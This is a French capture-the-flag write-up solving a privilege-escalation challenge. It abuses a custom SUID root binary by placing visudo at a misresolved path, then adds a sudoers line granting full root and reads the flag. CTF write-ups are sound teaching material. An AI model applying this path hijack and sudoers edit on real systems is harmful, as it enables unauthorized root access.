# pwnr00ter

## Information:

- Compte
- ssh://$USER@REDACTED:REDACTED

On nous parle donc d'un binaire `pwnr00ter`
On l'inspecte!
```bash
device@pwnr00ter-7eddae50:/tmp$ ls -lah /usr/bin/pwnr00ter 
-rwsr-sr-x 1 root root 16K Oct 23 16:36 /usr/bin/pwnr00ter
#  ^------------- Oh! SUID bit!
```

Daccord je fais un strings dessus!
```bash
strings /usr/bin/pwnr00ter 
bash: strings: command not found
```
Humm.. cat?
```
One must specify one permitted binary, no arguments allowed![+] Checking if [%s] is allowed to run with privileges
/usr/bin/whoami/usr/bin/date/usr/bin/uname/bin/bin/ping/usr/bin/hostname[-] [%s] not in allowed list, access denied!
[+] Access granted! Running [%s] as root
```

Ok je comprend donc qu'on a certain binaire disponible 
- /usr/bin/whoami
- /usr/bin/date
- /usr/bin/uname
- /bin/bin/ping
- /usr/bin/hostname

Essayons s'en un
``` bash
pwnr00ter ping
[+] pwnr00ter application starting ...

[+] Checking if [ping] is allowed to run with privileges
[+] Access granted! Running [ping] as root
: usage error: Destination address required
```
Je fais plusieurs tentative pour tenter de comprendre ce qui cloche et je me rend compte que.. `/bin/bin/ping` ? Attend.. ce n'est pas le bon path!
```bash
/bin$ mkdir bin
mkdir: cannot create directory ‘bin’: Permission denied
```
Bien entendu je ne peux pas ecrire dans `/bin`
Ce que je me questionn est pourquoi il a reussie a trouver `ping` si il est au path `/bin/bin/ping`?
Peut-etre qu'il gere mal les PATH
```bash
cp /usr/sbin/visudo /tmp/bin/bin/ping
```
Oh! Un gros paquet d'erreur mais j'arrive dans VI 
Ajout nous ceci

```
device  ALL=(ALL:ALL) ALL
```
Suivis de 
```bash
sudo -i
```

```bash
root@pwnr00ter-7eddae50:~# ls
flag.txt
root@pwnr00ter-7eddae50:~# cat flag.txt 
FINCTF{Thou shall not roll you own sudo}
```

Merci @`r3my` qui ma fais remarquer une erreur de debutant... j'ai oublier la premiere fois d'ajouter le `!` a `:wq`